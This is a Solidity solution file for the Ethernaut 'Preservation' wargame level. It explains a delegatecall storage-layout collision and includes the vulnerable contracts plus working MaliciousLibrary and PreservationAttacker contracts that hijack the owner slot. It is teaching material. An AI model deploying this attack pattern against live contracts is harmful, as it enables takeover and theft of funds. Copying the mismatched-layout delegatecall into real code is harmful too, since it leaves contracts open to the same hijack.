// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ──────────────────────────────────────────────────────────────────────────────
//  Ethernaut Level 16 — Preservation
//
//  VULNERABILITY: Storage layout collision via delegatecall.
//  Preservation stores timeZone1Library at slot 0. LibraryContract stores
//  storedTime at slot 0. When Preservation calls timeZone1Library.setTime(t)
//  via delegatecall, LibraryContract writes to *Preservation's* slot 0
//  (timeZone1Library address), not to LibraryContract's own storedTime.
//
//  EXPLOIT STEPS:
//  1. Deploy MaliciousLibrary — its setTime(uint) writes to slot 2 (owner slot).
//  2. Call preservation.setFirstTime(uint(uint160(maliciousLib))):
//       • Delegatecall into LibraryContract.setTime(addr_as_uint)
//       • LibraryContract writes to slot 0 of Preservation → timeZone1Library
//         is now overwritten with maliciousLib address.
//  3. Call preservation.setFirstTime(any_value):
//       • Now delegatecalls into MaliciousLibrary.setTime(any)
//       • MaliciousLibrary writes msg.sender to slot 2 of Preservation → owner
//         is now the attacker.
//
//  ROOT CAUSE: Delegatecall assumes the library has the SAME storage layout
//  as the caller. If they differ, writes land in wrong slots. Never delegatecall
//  into a contract with a mismatched storage layout.
// ──────────────────────────────────────────────────────────────────────────────

/// @title LibraryContract
/// @notice Legitimate library used by Preservation for time storage
/// @dev Storage layout mismatch with Preservation creates the vulnerability.
///      This contract has storedTime at slot 0, but Preservation has
///      timeZone1Library at slot 0. Delegatecall writes to wrong slot.
contract LibraryContract {
    /// @notice Stored time value (slot 0 — mismatches Preservation's slot 0)
    uint storedTime;

    /// @notice Set the stored time value
    /// @param _time The time value to store
    /// @dev When called via delegatecall, this writes to slot 0 of the CALLER's
    ///      storage, which in Preservation's case is the timeZone1Library address.
    function setTime(uint _time) public {
        storedTime = _time;
    }
}

/// @title Preservation
/// @notice Vulnerable contract demonstrating delegatecall storage collision
/// @dev The storage layout does not match LibraryContract's layout, causing
///      delegatecall writes to land in unexpected slots.
contract Preservation {
    /// @notice Address of timezone 1 library (slot 0)
    address public timeZone1Library;
    /// @notice Address of timezone 2 library (slot 1)
    address public timeZone2Library;
    /// @notice Owner of the contract (slot 2)
    address public owner;
    /// @notice Stored time value (slot 3)
    uint storedTime;

    /// @dev Function selector for setTime(uint256)
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    /// @notice Deploy Preservation with two library addresses
    /// @param _timeZone1LibraryAddress Address of first timezone library
    /// @param _timeZone2LibraryAddress Address of second timezone library
    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    /// @notice Set time using timezone 1 library via delegatecall
    /// @param _timeStamp The timestamp value to set
    /// @dev VULNERABILITY: delegatecall to library with mismatched storage layout.
    ///      The library writes to its slot 0 (storedTime), but in Preservation's
    ///      context, slot 0 is timeZone1Library — overwriting the library address.
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    /// @notice Set time using timezone 2 library via delegatecall
    /// @param _timeStamp The timestamp value to set
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// ──────────────────────────────────────────────────────────────────────────────
//  Attacker — malicious library that overwrites owner (slot 2)
// ──────────────────────────────────────────────────────────────────────────────

/// @title MaliciousLibrary
/// @notice Attacker library that mirrors Preservation's storage layout to write owner
/// @dev Matches Preservation's layout so that writing to `owner` (slot 2) in
///      delegatecall context correctly targets Preservation's owner slot.
contract MaliciousLibrary {
    /// @notice Slot 0 — mirrors Preservation.timeZone1Library (unused by exploit)
    address public timeZone1Library;
    /// @notice Slot 1 — mirrors Preservation.timeZone2Library (unused by exploit)
    address public timeZone2Library;
    /// @notice Slot 2 — mirrors Preservation.owner (target of the exploit)
    address public owner;

    /// @notice Overwrites owner with msg.sender when called via delegatecall
    /// @dev When Preservation delegatecalls this, msg.sender is the original
    ///      external caller. Writing to `owner` writes to Preservation's slot 2.
    function setTime(uint /*_time*/) public {
        owner = msg.sender;
    }
}

/// @title PreservationAttacker
/// @notice Orchestrates the two-step exploit to claim ownership of Preservation
contract PreservationAttacker {
    /// @notice Execute the two-step exploit to become owner of Preservation
    /// @param preservation The target Preservation contract instance
    /// @dev Step 1: Overwrite timeZone1Library with MaliciousLibrary address.
    ///      Step 2: Call setFirstTime again — now delegatecalls MaliciousLibrary
    ///      which writes msg.sender (this contract) into the owner slot.
    function attack(Preservation preservation) external {
        // Step 1: Replace timeZone1Library with MaliciousLibrary
        MaliciousLibrary mal = new MaliciousLibrary();
        preservation.setFirstTime(uint256(uint160(address(mal))));

        // Step 2: Now setFirstTime delegatecalls into MaliciousLibrary
        //         which writes msg.sender to slot 2 (owner)
        preservation.setFirstTime(0);
    }
}
